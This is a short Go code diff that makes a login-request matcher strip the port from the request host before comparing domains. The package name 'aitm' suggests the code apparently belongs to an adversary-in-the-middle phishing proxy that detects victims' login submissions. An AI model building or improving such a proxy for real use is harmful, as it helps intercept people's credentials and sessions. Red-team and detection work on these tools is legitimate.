@@ -67,7 +67,7 @@ func matchesLoginPath(login aitm.LoginSpec, req *http.Request) bool {
 	if req.Method != http.MethodPost {
 		return false
 	}
-	if login.Domain != "" && !strings.HasSuffix(strings.ToLower(req.Host), strings.ToLower(login.Domain)) {
+	if login.Domain != "" && !strings.HasSuffix(strings.ToLower(hostWithoutPort(req.Host)), strings.ToLower(login.Domain)) {
 		return false
 	}
 	if login.Path != "" && !strings.HasPrefix(req.URL.Path, login.Path) {
